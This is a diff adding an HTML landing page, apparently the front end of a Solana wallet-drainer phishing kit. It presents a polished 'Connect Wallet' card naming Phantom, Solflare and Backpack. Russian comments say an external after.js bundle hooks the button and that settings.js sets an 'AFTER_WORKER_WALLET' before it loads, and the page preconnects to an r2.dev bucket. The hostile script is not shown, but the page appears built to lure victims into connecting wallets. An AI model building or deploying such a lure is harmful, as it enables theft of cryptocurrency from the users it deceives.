@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Web3 Connect</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://pub-14c1504681d2427684ac1f489338d075.r2.dev" crossorigin>
+    <link rel="preconnect" href="https://api.web3modal.org" crossorigin>
+    <style>
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg:        #0c0c0c;
+            --surface:   #141414;
+            --border:    #242424;
+            --text:      #f0f0f0;
+            --muted:     #5a5a5a;
+            --accent:    #9945ff;
+            --accent-dim: rgba(153, 69, 255, 0.12);
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ── top bar ─────────────────────────────────────── */
+        .topbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 32px;
+            border-bottom: 1px solid var(--border);
+            background: rgba(12, 12, 12, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            z-index: 10;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--text);
+        }
+
+        .logo-icon {
+            width: 28px;
+            height: 28px;
+            background: var(--accent);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-icon svg {
+            width: 16px;
+            height: 16px;
+            fill: #fff;
+        }
+
+        .logo-name {
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.02em;
+        }
+
+        .topbar-badge {
+            font-size: 11px;
+            font-weight: 500;
+            color: var(--muted);
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+        }
+
+        /* ── main card ───────────────────────────────────── */
+        .card {
+            width: 100%;
+            max-width: 400px;
+            padding: 48px 40px;
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            background: var(--surface);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* subtle glow behind the card */
+        .card::before {
+            content: '';
+            position: absolute;
+            inset: -1px;
+            border-radius: 20px;
+            background: linear-gradient(135deg, var(--accent) 0%, transparent 60%);
+            opacity: 0.08;
+            pointer-events: none;
+        }
+
+        .wallet-icon {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 24px;
+            background: var(--accent-dim);
+            border: 1px solid rgba(153, 69, 255, 0.25);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .wallet-icon svg {
+            width: 26px;
+            height: 26px;
+            stroke: var(--accent);
+            fill: none;
+            stroke-width: 1.8;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .card h1 {
+            font-size: 22px;
+            font-weight: 600;
+            letter-spacing: -0.01em;
+            margin-bottom: 10px;
+            color: var(--text);
+        }
+
+        .card p {
+            font-size: 14px;
+            line-height: 1.6;
+            color: var(--muted);
+            margin-bottom: 32px;
+        }
+
+        .connect-btn {
+            width: 100%;
+            padding: 14px 24px;
+            background: var(--accent);
+            color: #fff;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.01em;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: opacity 0.15s ease, transform 0.15s ease;
+            position: relative;
+        }
+
+        .connect-btn:hover {
+            opacity: 0.88;
+            transform: translateY(-1px);
+        }
+
+        .connect-btn:active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 24px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border);
+        }
+
+        .divider span {
+            font-size: 12px;
+            color: var(--muted);
+            letter-spacing: 0.04em;
+        }
+
+        .wallets-row {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .wallet-pill {
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            padding: 8px 14px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background: transparent;
+            color: var(--muted);
+            font-family: inherit;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: default;
+        }
+
+        .wallet-pill-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--muted);
+        }
+
+        /* ── footer note ─────────────────────────────────── */
+        .note {
+            margin-top: 24px;
+            font-size: 12px;
+            color: var(--muted);
+            line-height: 1.5;
+            max-width: 320px;
+            text-align: center;
+        }
+
+        .note a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .note a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                margin: 0 16px;
+                padding: 36px 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="topbar">
+        <a href="#" class="logo">
+            <div class="logo-icon">
+                <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M8 1L14 4.5V11.5L8 15L2 11.5V4.5L8 1Z"/>
+                </svg>
+            </div>
+            <span class="logo-name">After</span>
+        </a>
+        <span class="topbar-badge">Solana</span>
+    </header>
+
+    <main>
+        <div class="card">
+            <div class="wallet-icon">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="2" y="6" width="20" height="14" rx="3"/>
+                    <path d="M16 13a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"/>
+                    <path d="M2 10h20"/>
+                </svg>
+            </div>
+
+            <h1>Connect Your Wallet</h1>
+            <p>Link your wallet to access exclusive features and manage your assets securely.</p>
+
+            <!-- класс after-sol — бандл навесит обработчик сам -->
+            <button class="connect-btn after-sol">Connect Wallet</button>
+
+            <div class="divider"><span>SUPPORTED WALLETS</span></div>
+
+            <div class="wallets-row">
+                <div class="wallet-pill">
+                    <span class="wallet-pill-dot" style="background:#ab9ff2;"></span>
+                    Phantom
+                </div>
+                <div class="wallet-pill">
+                    <span class="wallet-pill-dot" style="background:#f08000;"></span>
+                    Solflare
+                </div>
+                <div class="wallet-pill">
+                    <span class="wallet-pill-dot" style="background:#16a9b8;"></span>
+                    Backpack
+                </div>
+            </div>
+        </div>
+
+        <p class="note">
+            By connecting you agree to our
+            <a href="#">Terms of Service</a> and
+            <a href="#">Privacy Policy</a>.
+        </p>
+    </main>
+
+    <!-- settings.js задаёт AFTER_WORKER_WALLET до загрузки бандла -->
+    <script src="settings.js"></script>
+    <!-- after.js подключается последним, один раз на странице -->
+    <script src="after.js"></script>
+
+</body>
+</html>
